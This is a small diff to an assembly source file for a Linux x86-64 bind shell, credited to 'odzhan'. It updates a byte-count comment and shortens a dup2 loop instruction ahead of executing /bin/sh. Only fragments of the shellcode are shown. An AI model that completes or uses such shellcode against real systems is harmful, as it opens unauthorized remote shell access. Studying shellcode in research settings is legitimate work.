@@ -28,7 +28,7 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
 
-; 71 byte bind shell for linux/x86-64
+; 72 byte bind shell for linux/x86-64
 ; odzhan
 
     bits    64
@@ -79,7 +79,7 @@
 dup_loop64:
     mov     al, 33           ; rax = sys_dup2
     syscall
-    sub     esi, 1
+    dec     esi
     jns     dup_loop64       ; jump if not signed   
     
     ; step 6, execute /bin/sh
